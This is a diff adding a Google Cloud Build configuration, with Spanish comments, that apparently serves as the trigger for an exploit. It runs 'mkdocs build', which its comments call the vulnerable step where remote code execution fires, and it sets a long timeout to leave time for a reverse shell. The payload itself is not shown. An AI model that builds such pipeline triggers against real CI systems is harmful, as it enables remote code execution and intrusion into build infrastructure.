@@ -1,0 +1,19 @@
+steps:
+  # Instala las dependencias (necesarias para mkdocs y PyYAML)
+  - name: 'python'
+    entrypoint: 'pip'
+    args: ['install', '-r', 'requirements.txt']
+  
+  # Ejecuta el comando vulnerable de MkDocs
+  # Esta es la fase donde se dispara el RCE
+  - name: 'python'
+    entrypoint: 'python3'
+    args: ['-m', 'mkdocs', 'build', '--config-file', 'mkdocs.yml']
+  
+  # Paso de 'Limpieza' para que el build no falle completamente
+  # (Simula el paso de subida a GCS, que es donde el build suele terminar)
+  - name: 'gcr.io/cloud-builders/gsutil'
+    args: ['rsync', '-r', 'site/', 'gs://tmp_d215c297d915'] 
+    # Sustituye YOUR-TEMP-BUCKET-NAME por un bucket que crees.
+    
+timeout: '1600s' # Damos tiempo suficiente para la Reverse Shell (aunque se colgará antes)
